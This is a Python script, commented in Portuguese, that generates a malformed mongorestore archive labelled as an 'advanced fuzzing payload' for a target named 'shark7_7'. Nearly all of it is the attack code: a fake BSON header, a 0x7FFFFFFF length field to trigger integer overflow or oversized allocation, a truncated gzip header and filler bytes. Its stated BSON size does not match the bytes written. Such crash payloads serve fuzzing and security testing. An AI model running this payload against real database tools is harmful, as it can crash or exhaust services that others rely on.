import struct
import zlib

def build_shark7_7_payload():
    print("[*] Gerando payload avançado de fuzzing para a shark7_7...")

    # 1. Metadados BSON válidos para enganar o parser inicial (Header de Namespace)
    # O mongorestore procura por um documento BSON inicial descrevendo o banco e a coleção.
    # Tamanho do documento BSON simulado + campos padrão {"db": "test", "collection": "fuzz"}
    # Em BSON, cada elemento é [tipo][nome][valor]. Vamos montar um cabeçalho BSON bruto válido.
    
    # Corpo BSON básico válido (Little Endian):
    # Tamanho total do documento BSON (ex: 35 bytes)
    # \x02 (string type) + "db\x00" + \x05\x00\x00\x00 (tamanho string) + "test\x00"
    # \x00 (terminador BSON)
    fake_bson_meta = (
        b"\x23\x00\x00\x00"  # Tamanho do documento BSON (35 bytes)
        b"\x02"              # Tipo String
        b"db\x00"            # Chave "db"
        b"\x05\x00\x00\x00"  # Tamanho da string "test" (incluindo null byte)
        b"test\x00"          # Valor "test"
        b"\x00"              # Fim do doc BSON
    )

    with open("payload_overflow.archive", "wb") as f:
        # 2. Escreve o cabeçalho estrutural que o parser espera
        f.write(fake_bson_meta)

        # 3. Injeção do vetor de Integer Overflow / Malformed Length para o Stream
        # O parser lê um tamanho de bloco de 4 bytes para o payload comprimido/binário.
        # Em vez de um tamanho real, injetamos o limite máximo de um inteiro de 32 bits assinado (0x7FFFFFFF)
        # ou um valor negativo invertido em complement de dois para confundir verificações de tipo.
        malformed_stream_size = 0x7FFFFFFF  # ~2GB anunciados
        f.write(struct.pack("<I", malformed_stream_size))

        # 4. Stream Gzip truncado / malformado
        # Colocamos um header gzip válido básico (\x1f\x8b\x08) seguido de lixo corrompido.
        # Isso força o leitor de stream a tentar descompactar um volume absurdo de dados 
        # baseado no tamanho anunciado, gerando um estouro de alocação ou EOF inesperado.
        corrupted_gzip_header = b"\x1f\x8b\x08\x00\x00\x00\x00\x00\x00\x03"
        f.write(corrupted_gzip_header)
        
        # Preenche com lixo estruturado para consumir ciclos do parser sem fechar o descritor instantaneamente
        f.write(b"\x90" * 512)

    print("[+] Payload avançado gerado com sucesso: payload_overflow.archive")

if __name__ == "__main__":
    build_shark7_7_payload()
